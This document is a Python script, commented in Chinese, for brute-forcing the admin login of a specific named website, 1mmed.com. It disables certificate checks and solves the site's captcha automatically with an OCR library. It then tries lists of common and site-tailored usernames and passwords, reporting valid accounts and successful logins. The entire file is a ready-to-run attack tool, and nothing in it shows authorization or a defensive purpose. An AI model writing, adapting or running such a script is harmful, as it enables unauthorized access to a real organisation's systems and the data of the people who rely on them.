#!/usr/bin/env python3
"""1mmed.com 后台爆破v2(URL判断)"""
import urllib.request, http.cookiejar, ssl, sys, time, re
import ddddocr

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
B = "http://1mmed.com"
ocr = ddddocr.DdddOcr(show_ad=False)

def new_opener():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), urllib.request.HTTPSHandler(context=ctx))
    op.addheaders = [("User-Agent","Mozilla/5.0")]
    return op

def try_login(user, pw, max_attempts=10):
    op = new_opener()
    op.open(f"{B}/admin.php", timeout=8).read()
    for i in range(max_attempts):
        cap = op.open(f"{B}/admin.php/Code/index", timeout=8).read()
        try:
            code = ocr.classification(cap)
        except Exception:
            continue
        if len(code) < 4: continue
        data = f"username={user}&pwd={pw}&code={code}&TenantId=".encode()
        try:
            r = op.open(urllib.request.Request(f"{B}/admin.php", data=data), timeout=8)
            url = r.geturl()
            body = r.read().decode("utf-8","ignore")
            # 成功: 跳转到非Login的admin页面
            if "Login" not in url and "login" not in url:
                return f"SUCCESS: {url}"
            # 验证码错误提示
            if "验证码错误" in body or "验证码不正确" in body:
                continue
            # 密码/用户错误(留在登录页但验证码过了)
            return "AUTH_WRONG"
        except Exception:
            continue
    return "VERIFY_FAIL"

users = ["admin", "admin888", "1mmed", "test", "root", "yimu", "shanghai", "admin1",
         "admin2", "manager", "guanli", "caiwu", "kefu", "sysadmin", "webadmin"]
pwds = ["admin123", "123456", "admin", "admin888", "12345678", "a123456", "admin@123",
        "123123", "111111", "888888", "000000", "123456789", "abc123", "passw0rd",
        "Admin123", "Admin888", "yimu123", "yimu888", "1mmed123", "shanghai123",
        "admin2024", "admin2025", "admin2026", "qwe123", "zxc123", "147258369",
        "5201314", "woaini", "123456a", "Aa123456", "admin!@#", "admin#123",
        "123qwe", "asd123", "1234567890", "1qaz2wsx", "qazwsx", "zxcvbnm",
        "admin123456", "Admin@123", "admin666", "admin999", "test123", "test123456",
        "admin1234", "admin12345", "123456789a", "a123456789", "admin000", "admin001",
        "shanghaiyimu", "yimu123456", "1mmed2024", "1mmed2025", "1mmed2026",
        "admin@2024", "admin@2025", "admin@2026", "medical123", "yimu@123"]

for u in users:
    print(f"--- {u} ---", flush=True)
    for pw in pwds:
        r = try_login(u, pw)
        if r == "VERIFY_FAIL":
            print(f"  {u}/{pw}: 验证码多次失败", flush=True)
            break
        if r == "AUTH_WRONG":
            print(f"  !!! 用户存在(密码错): {u}", flush=True)
            break
        if r.startswith("SUCCESS"):
            print(f"  !!!!! {u}/{pw}: {r}", flush=True)
            sys.exit(0)
        time.sleep(0.1)
print("DONE")
